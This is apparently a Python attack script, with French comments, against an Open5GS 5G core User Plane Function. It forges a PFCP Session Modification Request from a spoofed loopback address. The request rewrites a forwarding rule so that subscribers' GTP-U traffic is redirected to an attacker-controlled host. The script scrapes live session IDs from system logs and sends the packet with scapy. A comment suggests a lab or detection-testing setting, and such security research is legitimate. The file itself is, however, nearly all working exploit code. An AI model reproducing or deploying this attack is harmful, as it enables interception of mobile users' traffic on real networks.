#!/usr/bin/env python3
"""
pfcp_attack — Redirection via Outer Header Creation
Implémenté réellement par Open5GS UPF
"""
import struct, socket, random, subprocess, re
from scapy.all import IP, UDP, Raw, send
# ⚠️ Utilise une IP loopback non déclarée comme légitime
ATTACK_SRC = "127.0.0.99"  
ATTACK_DST = "127.0.0.7"   # UPF PFCP IP
UPF_IP    = "127.0.0.7"
SMF_IP    = "127.0.0.4"
PFCP_PORT = 8805
ATTACKER  = "192.168.139.138"  # windows
ATTACKER_TEID = 0x00000001     # TEID fictif sur notre machine

# Types IE (tlv-type-list.py)
T_UPDATE_FAR                   = 10
T_UPDATE_FORWARDING_PARAMETERS = 11
T_APPLY_ACTION                 = 44
T_FAR_ID                       = 108
T_OUTER_HEADER_CREATION        = 84  # ← Outer Header Creation

MSG_SESSION_MODIFICATION_REQUEST = 52

def ie(t, data):
    return struct.pack(">HH", t, len(data)) + data

def ie_far_id(fid):
    return ie(T_FAR_ID, struct.pack(">I", fid))

def ie_apply_action():
    # 0x02 = FORW
    return ie(T_APPLY_ACTION, bytes([0x02]))

def ie_outer_header_creation(teid, ipv4):
    """
    Outer Header Creation IE :
    Octet 5-6 : Description = 0x0100 (GTP-U/UDP/IPv4)
    Octet 7-10: TEID
    Octet 11-14: IPv4
    """
    desc = 0x0100  # GTP-U over UDP/IPv4
    data = struct.pack(">H", desc)        # Description (2 octets)
    data += struct.pack(">I", teid)       # TEID (4 octets)
    data += socket.inet_aton(ipv4)        # IPv4 (4 octets)
    return ie(T_OUTER_HEADER_CREATION, data)

def ie_update_forwarding_parameters(teid, ipv4):
    # IE type 11 — contient Outer Header Creation
    return ie(T_UPDATE_FORWARDING_PARAMETERS,
              ie_outer_header_creation(teid, ipv4))

def ie_update_far(fid, teid, ipv4):
    inner  = ie_far_id(fid)
    inner += ie_apply_action()
    inner += ie_update_forwarding_parameters(teid, ipv4)
    return ie(T_UPDATE_FAR, inner)

def build_packet(seid, xid, payload):
    length = 8 + 4 + len(payload)
    sqn    = (xid << 8) & 0xFFFFFFFF
    header = struct.pack(">BBHQI", 0x21,
                         MSG_SESSION_MODIFICATION_REQUEST,
                         length, seid, sqn)
    return header + payload

def get_active_seid():
    result = subprocess.run(
        ["journalctl", "-u", "open5gs-upfd", "-n", "100"],
        capture_output=True, text=True
    )
    matches = re.findall(r'UP:(0x[0-9a-f]+)', result.stdout)
    if matches:
        seid = int(matches[-1], 16)
        print(f"[+] SEID actif : {hex(seid)}")
        return seid
    return None

if __name__ == "__main__":
    seid = get_active_seid()
    if not seid:
        print("[!] Aucune session active")
        exit(1)

    xid = random.randint(0x8000, 0xFFFF)
    print(f"[*] SEID       : {hex(seid)}")
    print(f"[*] FAR ID     : 1")
    print(f"[*] Redirect   : GTP-U → {ATTACKER} TEID={hex(ATTACKER_TEID)}")
    print(f"[*] XID        : {hex(xid)}\n")

    payload = ie_update_far(fid=1, teid=ATTACKER_TEID, ipv4=ATTACKER)
    raw     = build_packet(seid, xid, payload)

    declared = struct.unpack_from(">H", raw, 2)[0]
    actual   = len(raw) - 4
    print(f"[*] Length  : {declared}=={actual} {'✅' if declared==actual else '❌'}")
    print(f"[*] Hex     : {raw.hex(' ')}\n")

# ✅ APRÈS (utilise l'IP illicite → détecté immédiatement)
    pkt = IP(src=ATTACK_SRC, dst=UPF_IP) / \
          UDP(sport=PFCP_PORT, dport=PFCP_PORT) / \
          Raw(load=raw)
    send(pkt, verbose=0)
    print("[+] Paquet envoyé !")
    print("\n[*] Écouter le trafic GTP-U redirigé sur Windows :")
    print(f"    sudo tcpdump -i ens33 -n udp port 2152")
